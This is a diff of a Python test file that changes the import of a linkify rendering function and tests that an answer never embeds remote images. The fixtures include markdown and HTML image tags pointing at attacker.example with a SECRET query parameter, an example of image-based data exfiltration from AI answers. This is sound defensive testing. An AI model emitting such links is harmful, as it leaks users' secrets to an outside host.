@@ -345,10 +345,10 @@ def test_a_link_that_cannot_be_read_is_a_refused_row_not_an_error(client, monkey
 # --- H6: the remote-image channel ---------------------------------------------
 
 def test_an_answer_never_embeds_a_remote_image():
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    md = _linkify("Answer. ![x](https://attacker.example/p.png?d=SECRET)", remote_images=False)
-    raw = _linkify('Answer. <img src="https://attacker.example/p.png?d=SECRET">', remote_images=False)
+    md = linkify("Answer. ![x](https://attacker.example/p.png?d=SECRET)", remote_images=False)
+    raw = linkify('Answer. <img src="https://attacker.example/p.png?d=SECRET">', remote_images=False)
 
     for html in (md, raw):
         assert "<img" not in html
@@ -357,9 +357,9 @@ def test_an_answer_never_embeds_a_remote_image():
 
 
 def test_a_note_keeps_its_web_images():
-    from silica.ui.web.server import _linkify
+    from silica.ui.web.render import linkify
 
-    assert '<img src="https://example.org/fig.png"' in _linkify("![fig](https://example.org/fig.png)")
+    assert '<img src="https://example.org/fig.png"' in linkify("![fig](https://example.org/fig.png)")
 
 
 def test_on_the_server_the_page_draws_only_its_own_images(client, monkeypatch):
